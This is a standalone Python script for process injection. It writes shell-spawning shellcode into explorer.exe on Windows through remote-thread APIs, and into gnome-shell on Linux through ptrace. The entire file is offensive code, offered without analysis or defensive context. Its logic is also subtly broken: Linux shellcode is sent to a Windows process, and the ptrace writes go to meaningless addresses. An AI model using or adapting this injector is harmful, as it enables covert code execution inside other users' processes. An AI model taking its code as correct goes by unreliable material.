import os
import sys
import ctypes
import platform
import subprocess

# Define the shellcode to inject
shellcode = b"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e" \
            b"\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"

# For Windows
if platform.system() == "Windows":
    import ctypes
    from ctypes import wintypes

    # Define required Windows constants
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    CREATE_SUSPENDED = 0x4
    THREAD_EXECUTE = 0x1

    # Define the Windows API functions
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll

    # OpenProcess function
    OpenProcess = kernel32.OpenProcess
    OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    OpenProcess.restype = wintypes.HANDLE

    # VirtualAllocEx function
    VirtualAllocEx = kernel32.VirtualAllocEx
    VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                               wintypes.DWORD, wintypes.DWORD]
    VirtualAllocEx.restype = wintypes.LPVOID

    # WriteProcessMemory function
    WriteProcessMemory = kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_void_p,
                                   ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    WriteProcessMemory.restype = wintypes.BOOL

    # CreateRemoteThread function
    CreateRemoteThread = kernel32.CreateRemoteThread
    CreateRemoteThread.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.SECURITY_ATTRIBUTES),
                                  wintypes.DWORD, wintypes.LPVOID, wintypes.LPVOID,
                                  wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    CreateRemoteThread.restype = wintypes.HANDLE

    # Find the target process (for example, explorer.exe)
    def inject_shellcode_windows(target_process_name):
        # Find process ID by name
        pid = None
        for proc in os.popen('tasklist'):
            if target_process_name.lower() in proc.lower():
                pid = int(proc.split()[1])
                break

        if pid is None:
            print("Process not found!")
            return

        print(f"Found target process {target_process_name} with PID: {pid}")

        # Open the target process
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

        # Allocate memory for shellcode in the target process
        allocated_memory = VirtualAllocEx(process_handle, 0, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

        # Write the shellcode into the target process's memory
        WriteProcessMemory(process_handle, allocated_memory, shellcode, len(shellcode), None)

        # Create remote thread to execute the shellcode
        CreateRemoteThread(process_handle, None, 0, allocated_memory, 0, 0, None)

        print(f"Shellcode injected successfully into {target_process_name}.")

    # Inject shellcode into a process
    inject_shellcode_windows("explorer.exe")

# For Linux
elif platform.system() == "Linux":
    import ctypes
    import os
    import sys
    from ctypes import c_uint32, c_void_p

    # Define required Linux constants and functions
    libc = ctypes.CDLL("libc.so.6")
    ptrace = libc.ptrace
    ptrace.argtypes = [c_uint32, c_uint32, c_void_p, c_void_p]
    ptrace.restype = c_uint32
    PTRACE_ATTACH = 16
    PTRACE_DETACH = 17
    PTRACE_POKETEXT = 4

    # Inject shellcode into a Linux process using ptrace
    def inject_shellcode_linux(pid):
        # Attach to the target process
        result = ptrace(PTRACE_ATTACH, pid, None, None)
        if result != 0:
            print(f"Failed to attach to process {pid}.")
            return

        # Wait for the process to stop
        os.waitpid(pid, 0)

        # Inject shellcode into the target process memory
        for i in range(0, len(shellcode), 4):
            # Write shellcode in 4-byte chunks
            chunk = shellcode[i:i + 4]
            chunk_pointer = ctypes.c_void_p(chunk)
            ptrace(PTRACE_POKETEXT, pid, i, chunk_pointer)

        # Detach from the process
        ptrace(PTRACE_DETACH, pid, None, None)

        print(f"Shellcode injected into process {pid}.")

    # Find the target process (for example, gnome-shell)
    def find_process_pid(process_name):
        for proc in os.popen("ps aux"):
            if process_name in proc:
                return int(proc.split()[1])
        return None

    # Inject shellcode into a process (e.g., gnome-shell)
    pid = find_process_pid("gnome-shell")
    if pid:
        print(f"Found target process with PID: {pid}")
        inject_shellcode_linux(pid)
    else:
        print("Process not found!")

else:
    print("Unsupported OS.")